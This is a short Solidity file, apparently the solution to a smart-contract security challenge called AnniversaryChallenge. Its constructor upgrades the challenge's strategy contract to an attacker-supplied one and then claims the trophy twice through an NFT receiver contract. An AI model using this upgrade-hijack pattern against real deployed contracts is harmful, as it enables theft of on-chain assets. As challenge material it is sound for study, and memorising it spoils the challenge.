// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {AnniversaryChallenge} from "../../AnniversaryChallenge.sol";
import {Solution1Strategy} from "./Solution1Strategy.sol";
import {NftReceiver} from "./NftReceiver.sol";

contract Solution1 {
    constructor(address _challenge) payable {   
        AnniversaryChallenge challenge = AnniversaryChallenge(_challenge);      

        Solution1Strategy newStrategy = new Solution1Strategy();
        NftReceiver nftReceiver = new NftReceiver{ value: 1 wei }(msg.sender); 

        challenge.simpleStrategy().upgradeTo(address(newStrategy));
        challenge.claimTrophy(address(nftReceiver), 1e6);
        challenge.claimTrophy(address(nftReceiver), 1e6);
    }
}